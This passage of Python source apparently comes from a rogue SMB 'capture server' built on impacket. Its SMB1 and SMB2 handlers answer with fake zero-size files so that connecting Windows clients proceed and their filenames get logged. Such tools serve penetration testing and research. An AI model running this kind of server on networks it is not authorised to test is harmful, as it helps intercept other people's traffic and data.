            resp["OutputBufferLength"] = len(fs_data)
            resp["Buffer"] = fs_data
            self.logger.debug(
                "SMB2_QUERY_INFO FS DeviceInfo (%d bytes)",
                len(fs_data),
                is_server=True,
            )
            self.send_smb2_command(resp.getData(), packet)
            return

        if info_type not in (0x01, 0x02):
            self.logger.debug(
                "SMB2_QUERY_INFO InfoType=0x%02x not supported", info_type, is_server=True
            )
            self._smb2_error_response(packet, nt_errors.STATUS_NOT_SUPPORTED)
            return

        now = get_server_time()
        output_data: bytes | None = None

        if file_info_class == smb2.SMB2_FILE_NETWORK_OPEN_INFO:
            # [MS-FSCC] §2.4.29: FILE_NETWORK_OPEN_INFORMATION
            # 56 bytes: 4×FILETIME + AllocationSize + EndOfFile + Attributes + Reserved
            info = smb.SMBFileNetworkOpenInfo()
            info["CreationTime"] = now
            info["LastAccessTime"] = now
            info["LastWriteTime"] = now
            info["ChangeTime"] = now
            info["AllocationSize"] = 0
            info["EndOfFile"] = 0
            info["FileAttributes"] = smb2.FILE_ATTRIBUTE_ARCHIVE
            output_data = info.getData()

        elif file_info_class == smb2.SMB2_FILE_STANDARD_INFO:
            # [MS-FSCC] §2.4.41: FILE_STANDARD_INFORMATION
            # 24 bytes: AllocationSize + EndOfFile + NumberOfLinks + DeletePending + Directory
            info = smb2.FILE_STANDARD_INFORMATION()
            info["AllocationSize"] = 0
            info["EndOfFile"] = 0
            info["NumberOfLinks"] = 1
            info["DeletePending"] = 0
            info["Directory"] = 0
            output_data = info.getData()

        elif file_info_class == smb2.SMB2_FILE_BASIC_INFO:
            # [MS-FSCC] §2.4.7: FILE_BASIC_INFORMATION
            info = smb2.FILE_BASIC_INFORMATION()
            info["CreationTime"] = now
            info["LastAccessTime"] = now
            info["LastWriteTime"] = now
            info["ChangeTime"] = now
            info["FileAttributes"] = smb2.FILE_ATTRIBUTE_ARCHIVE
            output_data = info.getData()

        elif file_info_class == smb2.SMB2_FILE_ALL_INFO:
            # [MS-FSCC] §2.4.2: FILE_ALL_INFORMATION (composite)
            # Built from individual sub-structures because impacket's
            # composite FILE_ALL_INFORMATION fails to serialize when
            # sub-structure fields default to None.
            basic = smb2.FILE_BASIC_INFORMATION()
            basic["CreationTime"] = now
            basic["LastAccessTime"] = now
            basic["LastWriteTime"] = now
            basic["ChangeTime"] = now
            basic["FileAttributes"] = smb2.FILE_ATTRIBUTE_ARCHIVE
            std = smb2.FILE_STANDARD_INFORMATION()
            std["AllocationSize"] = 0
            std["EndOfFile"] = 0
            std["NumberOfLinks"] = 1
            std["DeletePending"] = 0
            std["Directory"] = 0
            internal = smb2.FILE_INTERNAL_INFORMATION()
            internal["IndexNumber"] = 0
            ea = smb2.FILE_EA_INFORMATION()
            ea["EaSize"] = 0
            access = smb2.FILE_ACCESS_INFORMATION()
            access["AccessFlags"] = 0x001F01FF  # FILE_ALL_ACCESS
            pos = smb2.FILE_POSITION_INFORMATION()
            pos["CurrentByteOffset"] = 0
            mode = smb2.FILE_MODE_INFORMATION()
            mode["Mode"] = 0
            align = smb2.FILE_ALIGNMENT_INFORMATION()
            align["AlignmentRequirement"] = 0
            name = smb2.FILE_NAME_INFORMATION()
            name["FileName"] = b""
            output_data = (
                basic.getData()
                + std.getData()
                + internal.getData()
                + ea.getData()
                + access.getData()
                + pos.getData()
                + mode.getData()
                + align.getData()
                + name.getData()
            )

        if output_data is None:
            self.logger.debug(
                "SMB2_QUERY_INFO FileInfoClass=%d not supported",
                file_info_class,
                is_server=True,
            )
            self._smb2_error_response(packet, nt_errors.STATUS_NOT_SUPPORTED)
            return

        resp = smb2.SMB2QueryInfo_Response()
        resp["OutputBufferOffset"] = 0x48  # 64 (header) + 8 (fixed response)
        resp["OutputBufferLength"] = len(output_data)
        resp["Buffer"] = output_data

        self.logger.debug(
            "SMB2_QUERY_INFO FileInfoClass=%d (%d bytes)",
            file_info_class,
            len(output_data),
            is_server=True,
        )
        self.send_smb2_command(resp.getData(), packet)

    def handle_smb2_read(self, packet: smb2.SMB2Packet) -> None:
        """SMB2 READ handler -- [MS-SMB2] §3.3.5.12.

        Returns ``STATUS_END_OF_FILE`` for all read requests.  The fake
        files created by :meth:`handle_smb2_create` have zero size, so
        any read attempt hits EOF immediately.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        try:
            req = smb2.SMB2Read(packet["Data"])
            file_id = smb2.SMB2_FILEID(req["FileID"].getData())
            self.logger.debug(
                "SMB2_READ FileId=0x%x Offset=%d Length=%d",
                file_id["Volatile"],
                req["Offset"],
                req["Length"],
                is_client=True,
            )
        except Exception:
            self.logger.debug("SMB2_READ (malformed)", is_client=True)
        self._smb2_error_response(packet, nt_errors.STATUS_END_OF_FILE)

    def handle_smb2_close(self, packet: smb2.SMB2Packet) -> None:
        """SMB2 CLOSE handler -- [MS-SMB2] §3.3.5.10.

        Acknowledges close requests with a spec-compliant CLOSE response.
        Per [MS-SMB2] §2.2.16, StructureSize MUST be 0x3C (60).

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        self.logger.debug("SMB2_CLOSE", is_client=True)
        # SMB2Close_Response has all zeros for timestamps/sizes — spec-compliant
        resp = smb2.SMB2Close_Response()
        self.send_smb2_command(resp.getData(), packet)

    def handle_smb2_write(self, packet: smb2.SMB2Packet) -> None:
        """SMB2 WRITE handler -- [MS-SMB2] §3.3.5.13.

        Acknowledges write requests.  No data is actually written — the
        fake files are read-only scaffolding.  Returns the requested
        byte count as ``Count`` so the client believes the write succeeded.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        count = 0
        try:
            req = smb2.SMB2Write(packet["Data"])
            count = req["Length"]
            self.logger.debug(
                "SMB2_WRITE Length=%d Offset=%d", count, req["Offset"], is_client=True
            )
        except Exception:
            self.logger.debug("SMB2_WRITE (malformed)", is_client=True)
        resp = smb2.SMB2Write_Response()
        resp["Count"] = count
        self.send_smb2_command(resp.getData(), packet)

    def handle_smb2_flush(self, packet: smb2.SMB2Packet) -> None:
        """SMB2 FLUSH handler -- [MS-SMB2] §3.3.5.11.

        Acknowledges flush requests.  No data is actually flushed — the
        fake files have no backing store.  Observed from Win8.1 and
        Srv2012R2 (SMB 3.0.2 IS_GUEST clients) after WRITE operations.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        self.logger.debug("SMB2_FLUSH", is_client=True)
        resp = smb2.SMB2Flush_Response()
        self.send_smb2_command(resp.getData(), packet)

    def handle_smb2_lock(self, packet: smb2.SMB2Packet) -> None:
        """SMB2 LOCK handler -- [MS-SMB2] §3.3.5.14.

        Acknowledges lock requests.  Response is 4 bytes
        (StructureSize + Reserved).

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        self.logger.debug("SMB2_LOCK", is_client=True)
        resp = smb2.SMB2Lock_Response()
        self.send_smb2_command(resp.getData(), packet)

    def handle_smb2_set_info(self, packet: smb2.SMB2Packet) -> None:
        """SMB2 SET_INFO handler -- [MS-SMB2] §3.3.5.21.

        Acknowledges set-info requests.  No attributes are actually
        changed — the fake files are immutable scaffolding.  Response
        is 2 bytes (StructureSize only).

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        try:
            req = smb2.SMB2SetInfo(packet["Data"])
            self.logger.debug(
                "SMB2_SET_INFO InfoType=0x%02x Class=%d",
                req["InfoType"],
                req["FileInfoClass"],
                is_client=True,
            )
        except Exception:
            self.logger.debug("SMB2_SET_INFO (malformed)", is_client=True)
        resp = smb2.SMB2SetInfo_Response()
        self.send_smb2_command(resp.getData(), packet)

    # -- SMB1 File Operations --

    def handle_smb1_nt_create(self, packet: smb.NewSMBPacket) -> None:
        """SMB1 NT_CREATE_ANDX handler -- [MS-SMB] §3.3.5.6.

        Returns a fake FID with ``STATUS_SUCCESS`` so the client proceeds
        to READ_ANDX, allowing filename capture.  Empty filenames (share
        root opens) get ``FILE_ATTRIBUTE_DIRECTORY``; all others get
        ``FILE_ATTRIBUTE_NORMAL``.

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        """
        name = ""
        try:
            cmd = smb.SMBCommand(packet["Data"][0])
            params = smb.SMBNtCreateAndX_Parameters(cmd["Parameters"])
            file_name_length: int = params["FileNameLength"]
            raw_data: bytes = cmd["Data"]
            is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)

            # [MS-SMB] §2.2.4.64.1: Unicode filenames have a 1-byte
            # alignment pad before the filename.
            if is_unicode:
                # Pad byte at offset 0 to align FileName to word boundary
                start = 1
                end = min(start + file_name_length, len(raw_data))
                name = (
                    raw_data[start:end]
                    .decode("utf-16-le", errors="replace")
                    .rstrip("\x00")
                )
            else:
                end = min(file_name_length, len(raw_data))
                name = raw_data[:end].decode("ascii", errors="replace").rstrip("\x00")
            self.logger.debug(
                "SMB_COM_NT_CREATE_ANDX Name=%s", name or "(empty)", is_client=True
            )
            if name:
                self.client_files.add(name)
        except Exception:
            self.logger.debug("SMB_COM_NT_CREATE_ANDX (malformed)", is_client=True)

        # Allocate a sequential FID
        self.smb1_fid_counter += 1
        now = get_server_time()
        is_dir = name == ""

        resp_params = smb.SMBNtCreateAndXResponse_Parameters()
        resp_params["OplockLevel"] = 0
        resp_params["Fid"] = self.smb1_fid_counter
        resp_params["CreateAction"] = 1  # FILE_OPENED
        resp_params["CreateTime"] = now
        resp_params["LastAccessTime"] = now
        resp_params["LastWriteTime"] = now
        resp_params["LastChangeTime"] = now
        # [MS-FSCC] §2.6: DIRECTORY (0x10) or ARCHIVE (0x20) per real Windows
        resp_params["FileAttributes"] = 0x10 if is_dir else 0x20
        resp_params["AllocationSize"] = 0
        resp_params["EndOfFile"] = 0
        resp_params["FileType"] = 0
        resp_params["IPCState"] = 0
        resp_params["IsDirectory"] = 1 if is_dir else 0

        self.logger.debug(
            "SMB_COM_NT_CREATE_ANDX Fid=%d IsDir=%s",
            self.smb1_fid_counter,
            is_dir,
            is_server=True,
        )
        self.send_smb1_command(
            smb.SMB.SMB_COM_NT_CREATE_ANDX,
            b"",
            resp_params,
            packet,
        )

    def _send_smb1_trans2_response(
        self,
        packet: smb.NewSMBPacket,
        trans_parameters: bytes = b"",
        trans_data: bytes = b"",
        error_code: int | None = None,
    ) -> None:
        """Build and send a TRANS2 response with correct offset layout.

        The TRANS2 response embeds sub-parameters and sub-data inside the
        SMB data section with absolute offsets from the SMB header start.
        Layout: SMBheader(32) + WordCount(1) + Words(20) + ByteCount(2)
        = 55 bytes fixed.  Pad1(1) aligns trans_parameters to offset 56.

        :param packet: The original TRANS2 request
        :param trans_parameters: Subcommand-specific parameter bytes
        :param trans_data: Subcommand-specific data bytes
        :param error_code: NTSTATUS error code, or None for STATUS_SUCCESS
        """
        # Absolute offsets from SMB header start
        # 32(hdr) + 1(WC) + 20(Words) + 2(BC) = 55
        pad1 = b"\x00"  # align to even offset (55 → 56)
        param_offset = 56 if trans_parameters else 0
        param_len = len(trans_parameters)

        # Pad2 between trans_parameters and trans_data (word-align)
        pad2_len = (param_len % 2) if trans_data else 0
        pad2 = b"\x00" * pad2_len
        data_offset = (param_offset + param_len + pad2_len) if trans_data else 0
        data_len = len(trans_data)

        resp_params = smb.SMBTransaction2Response_Parameters()
        resp_params["TotalParameterCount"] = param_len
        resp_params["TotalDataCount"] = data_len
        resp_params["ParameterCount"] = param_len
        resp_params["ParameterOffset"] = param_offset
        resp_params["ParameterDisplacement"] = 0
        resp_params["DataCount"] = data_len
        resp_params["DataOffset"] = data_offset
        resp_params["DataDisplacement"] = 0
        resp_params["SetupCount"] = 0
        resp_params["Setup"] = b""

        # Data = Pad1 + Trans_Parameters + Pad2 + Trans_Data
        resp_data = pad1 + trans_parameters + pad2 + trans_data

        self.send_smb1_command(
            smb.SMB.SMB_COM_TRANSACTION2,
            resp_data,
            resp_params,
            packet,
            error_code=error_code,
        )

    def _build_trans2_file_info(self, info_level: int) -> bytes | None:  # noqa: PLR0911
        """Build TRANS2 file information data for a given information level.

        Supports three encoding schemes observed from real Windows clients:

        1. **CIFS-native levels** (0x0001-0x0002, 0x0100-0x010b): defined in
           [MS-CIFS] section 2.2.8.3.  Used by NT 4.0 and as fallback.
        2. **NT pass-through levels** (0x03E8+): ``FileInformationClass + 0x03E8``
           per [MS-SMB] section 2.2.2.3.5.  Used by XP/Srv2003 when
           ``CAP_INFOLEVEL_PASSTHRU`` is negotiated.
        3. **Raw FileInformationClass** (small numbers 3-38): observed from
           XP SP3 in pcap -- sends the class number directly without the
           0x03E8 base.  Handled by the same native-class dispatch.

        :param info_level: The InformationLevel from the TRANS2 request
        :type info_level: int
        :return: Serialized file info bytes, or None if unsupported
        :rtype: bytes | None
        """
        now = get_server_time()

        # Pass-through base per [MS-SMB] §2.2.2.3.5
        PASS_THROUGH_BASE = 0x03E8

        # Normalise pass-through levels to native NT info class.
        # Raw FileInformationClass values (< 0x03E8) pass through unchanged,
        # which is correct — XP SP3 sends them without the 0x03E8 base.
        native = info_level
        if info_level >= PASS_THROUGH_BASE:
            native = info_level - PASS_THROUGH_BASE

        # ── CIFS-native levels ([MS-CIFS] §2.2.8.3) ──────────────────────

        # SMB_INFO_STANDARD (0x0001/0x0100) — NT 4.0
        # [MS-CIFS] §2.2.8.3.1: 3×(Date+Time) + DataSize + AllocationSize + Attributes
        if info_level in {0x0001, 0x0100}:
            return b"\x00" * 22

        # SMB_INFO_QUERY_EA_SIZE (0x0002/0x0200) — NT 4.0 EA query
        if info_level in {0x0002, 0x0200}:
            return b"\x00" * 26  # 22 (standard) + 4 (EaSize)

        # SMB_INFO_QUERY_EAS_FROM_LIST (0x0003) — Srv2003
        # [MS-CIFS] §2.2.8.3.3: return empty EA list (4-byte size = 0)
        if info_level == 0x0003:
            return b"\x00" * 4

        # 0x0006: dual meaning depending on TRANS2 subcommand:
        #   QUERY_PATH_INFORMATION: SMB_INFO_IS_NAME_VALID — empty SUCCESS
        #   QUERY_FILE_INFORMATION: FileInternalInformation (class 6) — 8-byte file ID
        # Since both return SUCCESS and the 8-byte response is a superset of
        # the empty response, always return 8 bytes.  [MS-FSCC] §2.4.20.
        if info_level == 0x0006:
            return b"\x00" * 8

        # SMB_QUERY_FILE_EA_INFO (0x0103) / FileEaInformation (class 7)
        # [MS-FSCC] §2.4.12: EaSize(4) — no EAs on fake files
        if native == 7 or info_level == 0x0103:
            return b"\x00" * 4

        # SMB_QUERY_FILE_ALL_INFO (0x0107) / FileAllInformation (class 15/0x0f)
        # [MS-CIFS] §2.2.8.3.8 / [MS-FSCC] §2.4.2: composite of sub-structures.
        # Built from individual pieces (same as SMB2 QUERY_INFO FileAllInfo).
        if native == 15 or info_level == 0x0107:
            basic = smb.SMBQueryFileBasicInfo()
            basic["CreationTime"] = now
            basic["LastAccessTime"] = now
            basic["LastWriteTime"] = now
            basic["LastChangeTime"] = now
            basic["ExtFileAttributes"] = smb2.FILE_ATTRIBUTE_ARCHIVE
            std = smb.SMBQueryFileStandardInfo()
            std["AllocationSize"] = 0
            std["EndOfFile"] = 0
            std["NumberOfLinks"] = 1
            std["DeletePending"] = 0
            std["Directory"] = 0
            # EaSize(4) + AccessFlags(4) + Position(8) + Mode(4) + Alignment(4)
            # + FileNameLength(4) + FileName(0)
            tail = b"\x00" * (4 + 4 + 8 + 4 + 4 + 4)
            return basic.getData() + std.getData() + b"\x00" * 8 + tail

        # SMB_QUERY_FILE_COMPRESSION (0x010b) / FileCompressionInformation (class 30/0x1e)
        # [MS-FSCC] §2.4.9: CompressedFileSize(8) + CompressionFormat(2) +
        # CompressionUnitShift(1) + ChunkShift(1) + ClusterShift(1) + Reserved(3)
        if native == 30 or info_level == 0x010B:
            return b"\x00" * 16

        # ── NT FileInformationClass (pass-through or raw) ────────────────

        # FileBasicInformation (class 4) / SMB_QUERY_FILE_BASIC_INFO (0x0101)
        if native == 4 or info_level == smb.SMB_QUERY_FILE_BASIC_INFO:
            file_info = smb.SMBQueryFileBasicInfo()
            file_info["CreationTime"] = now
            file_info["LastAccessTime"] = now
            file_info["LastWriteTime"] = now
            file_info["LastChangeTime"] = now
            file_info["ExtFileAttributes"] = smb2.FILE_ATTRIBUTE_ARCHIVE
            return file_info.getData()

        # FileStandardInformation (class 5) / SMB_QUERY_FILE_STANDARD_INFO (0x0102)
        if native == 5 or info_level == smb.SMB_QUERY_FILE_STANDARD_INFO:
            file_info = smb.SMBQueryFileStandardInfo()
            file_info["AllocationSize"] = 0
            file_info["EndOfFile"] = 0
            file_info["NumberOfLinks"] = 1
            file_info["DeletePending"] = 0
            file_info["Directory"] = 0
            return file_info.getData()

        # FileInternalInformation (class 6) — XP SP3/SP0/Srv2003
        # [MS-FSCC] §2.4.20: IndexNumber(8) — unique file ID
        if native == 6:
            return b"\x00" * 8

        # FilePositionInformation (class 11/0x0b) — XP SP3
        # [MS-FSCC] §2.4.32: CurrentByteOffset(8)
        if native == 11:
            return b"\x00" * 8

        # FileNamesInformation (class 12/0x0c) — XP SP3/Srv2003
        # [MS-FSCC] §2.4.28: NextEntryOffset(4) + FileIndex(4) +
        # FileNameLength(4) + FileName(variable) — return empty entry
        if native == 12:
            return b"\x00" * 12

        # FileModeInformation (class 13/0x0d) — XP SP3/SP0
        # [MS-FSCC] §2.4.26: Mode(4)
        if native == 13:
            return b"\x00" * 4

        # FileAlignmentInformation (class 14/0x0e) — XP SP3/SP0
        # [MS-FSCC] §2.4.3: AlignmentRequirement(4) — 0 = byte-aligned
        if native == 14:
            return b"\x00" * 4

        # FileAllocationInformation (class 16/0x10) — XP SP3/SP0
        # This is a SET class per spec, but XP queries it.
        # [MS-FSCC] §2.4.4: AllocationSize(8)
        if native == 16:
            return b"\x00" * 8

        # FileNetworkOpenInformation (class 34/0x22 or raw 0x0026=38)
        # [MS-FSCC] §2.4.29: 4×FILETIME + sizes + attributes (56 bytes)
        # Note: 0x0026 = 38 decimal — observed from XP SP3 as raw class.
        if native in {34, 38}:
            info = smb.SMBFileNetworkOpenInfo()
            info["CreationTime"] = now
            info["LastAccessTime"] = now
            info["LastWriteTime"] = now
            info["ChangeTime"] = now
            info["AllocationSize"] = 0
            info["EndOfFile"] = 0
            info["FileAttributes"] = smb2.FILE_ATTRIBUTE_ARCHIVE
            return info.getData()

        # FilePipeInformation (class 23/0x17) — XP SP3 on IPC$
        # [MS-FSCC] §2.4.31: ReadMode(4) + CompletionMode(4)
        if native == 23:
            return b"\x00" * 8

        # FilePipeLocalInformation (class 24/0x18) — XP SP3 on IPC$
        # [MS-FSCC] §2.4.30: 9 × ULONG (36 bytes)
        if native == 24:
            return b"\x00" * 36

        # FilePipeRemoteInformation (class 25/0x19) — XP SP3 on IPC$
        # [MS-FSCC] §2.4.31: CollectDataTime(8) + MaximumCollectionCount(4)
        if native == 25:
            return b"\x00" * 12

        # FileMailslotQueryInformation (class 26/0x1a) — XP SP3
        # Not defined in [MS-FSCC]; return minimal 4-byte response
        if native == 26:
            return b"\x00" * 4

        # ── Samba Unix extensions ─────────────────────────────────────────

        # SMB_QUERY_FILE_UNIX_BASIC (0x0120)
        # Samba extension — smbclient sends this before READ on NT1.
        if info_level == 0x0120:
            return b"\x00" * 100

        return None

    def handle_smb1_trans2(self, packet: smb.NewSMBPacket) -> None:
        """SMB1 TRANSACTION2 handler -- [MS-CIFS] §3.3.5.34.

        Dispatches TRANS2 subcommands:

        - ``TRANS2_QUERY_PATH_INFORMATION`` (0x0005): returns
          ``STATUS_SUCCESS`` with ``SMBQueryFileBasicInfo`` (directory
          attributes + timestamps) so SMB1 clients proceed to
          NT_CREATE_ANDX.
        - ``TRANS2_QUERY_FILE_INFORMATION`` (0x0007): returns file
          metadata by FID.  XP/Srv2003 send pass-through level
          ``0x03ed`` (FileStandardInformation) after NT_CREATE_ANDX.
        - ``TRANS2_FIND_FIRST2`` (0x0001): ``STATUS_NO_MORE_FILES``
        - Others: ``STATUS_NOT_IMPLEMENTED``

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        """
        subcommand = -1
        try:
            cmd = smb.SMBCommand(packet["Data"][0])
            trans2_params = smb.SMBTransaction2_Parameters(cmd["Parameters"])
            setup_data: bytes = trans2_params["Setup"]
            if len(setup_data) >= 2:
                subcommand = int.from_bytes(setup_data[:2], "little")
            self.logger.debug(
                "SMB_COM_TRANSACTION2 Subcommand=0x%04x", subcommand, is_client=True
            )
        except Exception:
            self.logger.debug("SMB_COM_TRANSACTION2 (malformed)", is_client=True)

        if subcommand == smb.SMB.TRANS2_QUERY_PATH_INFORMATION:
            # [MS-CIFS] §2.2.6.6.2: return basic file info so the client
            # proceeds to NT_CREATE_ANDX.  EaErrorOffset=0 as parameter,
            # SMBQueryFileBasicInfo (40 bytes) as data.
            now = get_server_time()
            file_info = smb.SMBQueryFileBasicInfo()
            file_info["CreationTime"] = now
            file_info["LastAccessTime"] = now
            file_info["LastWriteTime"] = now
            file_info["LastChangeTime"] = now
            file_info["ExtFileAttributes"] = 0x10  # FILE_ATTRIBUTE_DIRECTORY

            # Trans2 parameter for QUERY_PATH_INFO response: EaErrorOffset(2)
            ea_error = b"\x00\x00"
            self._send_smb1_trans2_response(
                packet,
                trans_parameters=ea_error,
                trans_data=file_info.getData(),
            )
        elif subcommand == smb.SMB.TRANS2_QUERY_FILE_INFORMATION:
            # [MS-CIFS] §2.2.6.8: TRANS2_QUERY_FILE_INFORMATION
            # Request parameters: FID(2) + InformationLevel(2)
            # XP/Srv2003 send pass-through level 0x03ed (FileStandardInfo).
            info_level = 0
            try:
                # [MS-CIFS] §2.2.6.8.1: TRANS2_QUERY_FILE_INFORMATION
                # Trans2_Parameters: FID(2) + InformationLevel(2)
                # In the raw SMB data, sub-parameters start after Pad1.
                # ParameterOffset (from trans2_params) gives the absolute
                # offset from the SMB header start.  Relative to cmd["Data"]:
                # Pad1(1) + sub-parameters start at offset 1.
                raw_data: bytes = cmd["Data"]
                # Pad1 is 1 byte, then FID(2) + InformationLevel(2)
                if len(raw_data) >= 5:
                    info_level = int.from_bytes(raw_data[3:5], "little")
                self.logger.debug(
                    "TRANS2_QUERY_FILE_INFORMATION InfoLevel=0x%04x",
                    info_level,
                    is_client=True,
                )
            except Exception:
                self.logger.debug(
                    "TRANS2_QUERY_FILE_INFORMATION (malformed)",
                    is_client=True,
                    exc_info=True,
                )

            file_data = self._build_trans2_file_info(info_level)
            if file_data is not None:
                ea_error = b"\x00\x00"
                self._send_smb1_trans2_response(
                    packet,
                    trans_parameters=ea_error,
                    trans_data=file_data,
                )
            else:
                self.logger.debug(
                    "TRANS2_QUERY_FILE_INFORMATION InfoLevel=0x%04x not supported",
                    info_level,
                    is_server=True,
                )
                self._send_smb1_trans2_response(
                    packet,
                    error_code=nt_errors.STATUS_NOT_SUPPORTED,
                )
        elif subcommand == smb.SMB.TRANS2_QUERY_FS_INFORMATION:
            # [MS-CIFS] §2.2.6.4: NT 4.0 queries filesystem info after
            # tree connect.  Return empty success — the info level doesn't
            # matter for a capture server; the client proceeds regardless.
            self.logger.debug("TRANS2_QUERY_FS_INFORMATION", is_client=True)
            self._send_smb1_trans2_response(
                packet,
                trans_parameters=b"\x00\x00",
                trans_data=b"\x00" * 24,  # minimal FS info
            )
        elif subcommand == smb.SMB.TRANS2_FIND_FIRST2:
            self._send_smb1_trans2_response(
                packet,
                error_code=nt_errors.STATUS_NO_MORE_FILES,
            )
        else:
            self.send_smb1_command(
                smb.SMB.SMB_COM_TRANSACTION2,
                b"",
                b"",
                packet,
                error_code=nt_errors.STATUS_NOT_IMPLEMENTED,
            )

    def handle_smb1_read(self, packet: smb.NewSMBPacket) -> None:
        """SMB1 READ_ANDX handler -- [MS-CIFS] §3.3.5.38.

        Returns ``STATUS_END_OF_FILE`` for all read requests.  The fake
        files have zero size, so any read hits EOF immediately.

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        """
        try:
            cmd = smb.SMBCommand(packet["Data"][0])
            params = smb.SMBReadAndX_Parameters(cmd["Parameters"])
            self.logger.debug(
                "SMB_COM_READ_ANDX Fid=%d Offset=%d",
                params["Fid"],
                params["Offset"],
                is_client=True,
            )
        except Exception:
            self.logger.debug("SMB_COM_READ_ANDX (malformed)", is_client=True)
        self.send_smb1_command(
            smb.SMB.SMB_COM_READ_ANDX,
            b"",
            b"",
            packet,
            error_code=nt_errors.STATUS_END_OF_FILE,
        )

    def handle_smb1_close(self, packet: smb.NewSMBPacket) -> None:
        """SMB1 CLOSE handler -- [MS-CIFS] §3.3.5.27.

        Acknowledges close requests.  ``SMB_COM_CLOSE`` is NOT an AndX
        command — the response has zero parameter words and zero data
        bytes.

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        """
        try:
            cmd = smb.SMBCommand(packet["Data"][0])
            params = smb.SMBClose_Parameters(cmd["Parameters"])
            self.logger.debug("SMB_COM_CLOSE Fid=%d", params["FID"], is_client=True)
        except Exception:
            self.logger.debug("SMB_COM_CLOSE (malformed)", is_client=True)
        self.send_smb1_command(
            smb.SMB.SMB_COM_CLOSE,
            b"",
            b"",
            packet,
        )


# --- Server ------------------------------------------------------------------
class SMBServer(ThreadingTCPServer):
    """Threaded TCP server that spawns an :class:`SMBHandler` per connection.

    Generates a stable 16-byte ``ServerGuid`` per [MS-SMB2] §2.2.4 that
    persists for the lifetime of this server instance (shared across all
    connections handled by this listener).
    """

    default_handler_class = SMBHandler
    default_port = 445

    def __init__(
        self,
        config: SessionConfig,
        server_config: SMBServerConfig,
        server_address: tuple[str, int] | None = None,
        RequestHandlerClass: type | None = None,
    ) -> None:
        """Initialize the SMB TCP server with a stable ServerGuid.

        Generates a random 16-byte ServerGuid per [MS-SMB2] §2.2.4 that
        persists for the lifetime of this server instance. Delegates to
        :class:`ThreadingTCPServer` for socket binding and thread management.

        :param config: The active session configuration
        :type config: SessionConfig
        :param server_config: SMB-specific server configuration from TOML
        :type server_config: SMBServerConfig
        :param server_address: The ``(bind_address, port)`` tuple, defaults to None
        :type server_address: tuple[str, int] | None, optional
        :param RequestHandlerClass: Override handler class, defaults to None
            (uses :class:`SMBHandler`)
        :type RequestHandlerClass: type | None, optional
        """
        self.server_config = server_config
        # Stable ServerGuid per server instance — [MS-SMB2] §2.2.4
        self.server_guid: bytes = secrets.token_bytes(16)
        super().__init__(config, server_address, RequestHandlerClass)

    def finish_request(
        self, request: typing.Any, client_address: tuple[str, int]
    ) -> None:
        """Instantiate the handler class to process a single client connection.

        Overrides :meth:`ThreadingTCPServer.finish_request` to pass the
        additional ``server_config`` argument required by :class:`SMBHandler`.

        :param request: The raw socket/request object for this connection
        :type request: typing.Any
        :param client_address: The ``(host, port)`` tuple of the connecting client
        :type client_address: tuple[str, int]
        """
        typing.cast("type", self.RequestHandlerClass)(
            self.config, self.server_config, request, client_address, self
        )
